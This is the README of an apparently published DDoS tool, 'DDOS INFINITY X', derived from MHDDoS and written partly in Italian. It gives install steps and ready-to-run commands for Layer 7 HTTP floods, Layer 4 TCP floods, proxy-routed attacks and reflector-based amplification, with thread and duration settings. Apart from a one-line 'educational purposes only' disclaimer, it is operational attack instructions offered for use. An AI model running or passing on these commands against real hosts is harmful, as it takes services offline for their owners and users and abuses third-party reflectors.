<h1 align="center">DDOS INFINITY X</h1>
<p align="center"><strong>DDoS Attack Script — 57+ Methods</strong></p>
<p align="center"><em>Created by <strong>adil fayyaz</strong> · Python 3</em></p>

<p align="center">
  <a href="https://github.com/Infinity-X202/DDOS-INFINITY-X"><img alt="GitHub" src="https://img.shields.io/github/stars/Infinity-X202/DDOS-INFINITY-X?style=for-the-badge"></a>
  <a href="https://github.com/Infinity-X202/DDOS-INFINITY-X/blob/main/LICENSE"><img alt="License" src="https://img.shields.io/github/license/Infinity-X202/DDOS-INFINITY-X?style=for-the-badge"></a>
</p>

<p align="center">For educational purposes only. Do not attack websites without the owner's consent.</p>

<p align="center">
  <a href="docs/KALI_LINUX.md"><strong>Kali Linux install</strong></a> ·
  <a href="COMMANDS.md"><strong>All commands</strong></a>
</p>

---

## Kali Linux — install & run (copy this)

```bash
cd ~
rm -rf DDOS-INFINITY-X
git clone https://github.com/Infinity-X202/DDOS-INFINITY-X.git
cd DDOS-INFINITY-X
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
python3 start.py HELP
```

Every time you open a new terminal:

```bash
cd ~/DDOS-INFINITY-X
source venv/bin/activate
python3 start.py HELP
```

## Other Linux / Windows

```bash
git clone https://github.com/Infinity-X202/DDOS-INFINITY-X.git
cd DDOS-INFINITY-X
pip3 install -r requirements.txt
python3 start.py HELP
```

---

## Commands (quick reference)

Full list: **[COMMANDS.md](COMMANDS.md)**

```bash
python3 start.py SIM http://127.0.0.1:8080/  # demo: sembra reale, zero traffico
python3 start.py MENU          # menu 1-5 (5 = simulazione)
python3 start.py 1 http://TUO-SITO.com   # attacco L7 veloce (solo tuo lab)
python3 start.py 2 1.1.1.1:80            # attacco L4 veloce (TCP)
python3 start.py HELP
python3 start.py tools
python3 start.py STOP
```

**Menu numerico:**

| Tasto | Azione |
|-------|--------|
| **1** | Attacco L7 (GET) — chiede solo URL |
| **2** | Attacco L4 (TCP) — chiede solo ip:port |
| **3** | Tools |
| **4** | Lista metodi + HELP |
| **0** | Esci |

**Layer 7:**
```bash
python3 start.py GET http://example.com 0 1000 http.txt 10 100
```

**Layer 4:**
```bash
python3 start.py TCP 1.1.1.1:80 500 60
```

**Syntax:**
```bash
# L7
python3 start.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>

# L4
python3 start.py <method> <ip:port> <threads> <duration>

# L4 + proxy
python3 start.py <method> <ip:port> <threads> <duration> <socks_type> <proxylist>

# L4 amplification
python3 start.py <method> <ip:port> <threads> <duration> <reflector.txt>
```

---

## Docker

```bash
git clone https://github.com/Infinity-X202/DDOS-INFINITY-X.git
cd DDOS-INFINITY-X
docker compose build
docker compose run -it --entrypoint /bin/bash infinityx
```

---

## Requirements

* Python 3.10+
* Git (for PyRoxy)
* See `requirements.txt`

---

## Links

* **Repository:** https://github.com/Infinity-X202/DDOS-INFINITY-X
* **Author:** adil fayyaz

## Credits

Based on [MHDDoS](https://github.com/MatrixTM/MHDDoS) (MIT).

## License

MIT — see [LICENSE](LICENSE).
